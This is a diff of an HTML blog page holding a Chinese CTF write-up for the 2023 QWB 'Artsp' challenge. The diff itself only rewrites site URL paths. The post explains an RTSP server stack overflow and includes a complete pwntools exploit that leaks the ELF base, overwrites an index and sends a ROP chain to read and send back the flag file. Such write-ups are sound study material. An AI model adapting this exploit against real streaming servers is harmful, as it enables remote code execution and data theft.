@@ -5,31 +5,31 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="首先是GET_PARAMETER可以泄漏ELF地址  然后SET_PARAMETER可以设置好后面需要用到的flag标志  最后DESCRIBE先判断前面设置的标记，然后才能进入漏洞位置，造成栈溢出">
 <meta property="og:type" content="article">
 <meta property="og:title" content="qwb2023_Artsp">
-<meta property="og:url" content="https://github.com/ha1vk/2023/12/18/qwb2023-Artsp/index.html">
+<meta property="og:url" content="https://github.com/2023/12/18/qwb2023-Artsp/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="首先是GET_PARAMETER可以泄漏ELF地址  然后SET_PARAMETER可以设置好后面需要用到的flag标志  最后DESCRIBE先判断前面设置的标记，然后才能进入漏洞位置，造成栈溢出">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2023/12/18/qwb2023-Artsp/1.png">
-<meta property="og:image" content="https://github.com/ha1vk/2023/12/18/qwb2023-Artsp/2.png">
-<meta property="og:image" content="https://github.com/ha1vk/2023/12/18/qwb2023-Artsp/3.png">
+<meta property="og:image" content="https://github.com/2023/12/18/qwb2023-Artsp/1.png">
+<meta property="og:image" content="https://github.com/2023/12/18/qwb2023-Artsp/2.png">
+<meta property="og:image" content="https://github.com/2023/12/18/qwb2023-Artsp/3.png">
 <meta property="article:published_time" content="2023-12-18T13:48:05.000Z">
 <meta property="article:modified_time" content="2025-06-26T07:58:23.257Z">
 <meta property="article:author" content="ha1vk">
@@ -37,9 +37,9 @@
 <meta property="article:tag" content="ROP">
 <meta property="article:tag" content="变量覆盖">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2023/12/18/qwb2023-Artsp/1.png">
+<meta name="twitter:image" content="https://github.com/2023/12/18/qwb2023-Artsp/1.png">
 
-<link rel="canonical" href="https://github.com/ha1vk/2023/12/18/qwb2023-Artsp/">
+<link rel="canonical" href="https://github.com/2023/12/18/qwb2023-Artsp/">
 
 
 <script id="page-configurations">
@@ -101,7 +101,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -122,27 +122,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -200,10 +200,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2023/12/18/qwb2023-Artsp/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2023/12/18/qwb2023-Artsp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -238,7 +238,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -261,11 +261,11 @@
 
       
         <p>首先是GET_PARAMETER可以泄漏ELF地址</p>
-<img src="/ha1vk/2023/12/18/qwb2023-Artsp/1.png" class="">
+<img src="/2023/12/18/qwb2023-Artsp/1.png" class="">
 <p>然后SET_PARAMETER可以设置好后面需要用到的flag标志</p>
-<img src="/ha1vk/2023/12/18/qwb2023-Artsp/2.png" class="">
+<img src="/2023/12/18/qwb2023-Artsp/2.png" class="">
 <p>最后DESCRIBE先判断前面设置的标记，然后才能进入漏洞位置，造成栈溢出</p>
-<img src="/ha1vk/2023/12/18/qwb2023-Artsp/3.png" class="">
+<img src="/2023/12/18/qwb2023-Artsp/3.png" class="">
 
 <p>构造时需要注意数组下标v11也会被覆盖，因此在到v11的位置时，将v11覆盖使得dest[v11]指向函数的返回栈的地址，即可写入ROP</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#ip = &#x27;192.168.190.132&#x27;</span></span><br><span class="line"><span class="comment">#port = 8554</span></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;8.147.131.244&#x27;</span></span><br><span class="line">port = <span class="number">28951</span></span><br><span class="line">sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;rtsp://%s:%d/wavAudioTest&#x27;</span> % (ip,port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;SETUP %s RTSP/1.0\r\n&#x27;</span> % url</span><br><span class="line">payload += <span class="string">&#x27;CSeq: 1\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;User-Agent: LibVLC/3.0.18 (LIVE555 Streaming Media v2016.11.28)\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;Transport: RTP/TCP;unicast;client_port=49792-49793\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Session: &#x27;</span>)</span><br><span class="line">session =sh.recvuntil(<span class="string">&#x27;;&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">payload = <span class="string">&#x27;GET_PARAMETER %s RTSP/1.0\r\n&#x27;</span> % <span class="string">&#x27;*&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;CSeq: 2\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;GET_INFO: 2023\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;User-Agent: LibVLC/3.0.18 (LIVE555 Streaming Media v2016.11.28)\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;Session: %s\r\n&#x27;</span> % session</span><br><span class="line">payload += <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;this &#x27;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x2a9990</span></span><br><span class="line">fopen_addr = elf_base + <span class="number">0x18090</span></span><br><span class="line">read_addr = elf_base + <span class="number">0x18200</span></span><br><span class="line">send_addr = elf_base + <span class="number">0x2949D</span></span><br><span class="line">pop_rdi = elf_base + <span class="number">0x000000000007b133</span></span><br><span class="line">pop_rsi = elf_base + <span class="number">0x0000000000099fb0</span></span><br><span class="line">pop_rdx = elf_base + <span class="number">0x0000000000019eaa</span></span><br><span class="line">pop_rax = elf_base + <span class="number">0x0000000000035e4a</span></span><br><span class="line">flag_addr = elf_base + <span class="number">0x7B3E5</span></span><br><span class="line">mode_addr = elf_base + <span class="number">0x1467</span></span><br><span class="line">buf_addr = elf_base + <span class="number">0x2A9990</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;elf_base=&#x27;</span>,<span class="built_in">hex</span>(elf_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;fopen_addr=&#x27;</span>,<span class="built_in">hex</span>(fopen_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;read_addr=&#x27;</span>,<span class="built_in">hex</span>(read_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;send_addr=&#x27;</span>,<span class="built_in">hex</span>(send_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;SET_PARAMETER %s RTSP/1.0\r\n&#x27;</span> % <span class="string">&#x27;*&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;CSeq: 3\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;DESCRIBE_FLAG: qwb\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;User-Agent: LibVLC/3.0.18 (LIVE555 Streaming Media v2016.11.28)\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;Session: %s\r\n&#x27;</span> % session</span><br><span class="line">payload += <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;202 OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(mode_addr) + p64(fopen_addr)</span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">8</span>) + p64(pop_rsi) + p64(buf_addr) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read_addr)</span><br><span class="line">rop += p64(pop_rax) + p64(<span class="number">5</span>) + p64(pop_rsi) + p64(buf_addr) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(send_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#override index</span></span><br><span class="line">pay = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x198</span>-<span class="number">0xc</span>) + p16(<span class="number">0x1a8</span>-<span class="number">0x2</span>)</span><br><span class="line">pay += rop</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;DESCRIBE %s RTSP/1.0\r\n&#x27;</span> % url</span><br><span class="line">payload += <span class="string">&#x27;CSeq: 4\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;vul_string: %s\r\n&#x27;</span> % pay</span><br><span class="line"><span class="comment">#payload += &#x27;User-Agent: LibVLC/3.0.18 (LIVE555 Streaming Media v2016.11.28)\r\n&#x27;</span></span><br><span class="line"><span class="comment">#payload += &#x27;Session: %s\r\n&#x27; % session</span></span><br><span class="line">payload += <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
@@ -277,9 +277,9 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"># 栈溢出</a>
-              <a href="/ha1vk/tags/ROP/" rel="tag"># ROP</a>
-              <a href="/ha1vk/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" rel="tag"># 变量覆盖</a>
+              <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"># 栈溢出</a>
+              <a href="/tags/ROP/" rel="tag"># ROP</a>
+              <a href="/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" rel="tag"># 变量覆盖</a>
           </div>
 
         
@@ -288,11 +288,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2023/12/18/qwb2023-wtoa/" rel="prev" title="qwb2023_wtoa">
+    <a href="/2023/12/18/qwb2023-wtoa/" rel="prev" title="qwb2023_wtoa">
       <i class="fa fa-chevron-left"></i> qwb2023_wtoa
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2023/12/18/qwb2023-warmup23/" rel="next" title="qwb2023_warmup23">
+    <a href="/2023/12/18/qwb2023-warmup23/" rel="next" title="qwb2023_warmup23">
       qwb2023_warmup23 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -364,20 +364,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -450,30 +450,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
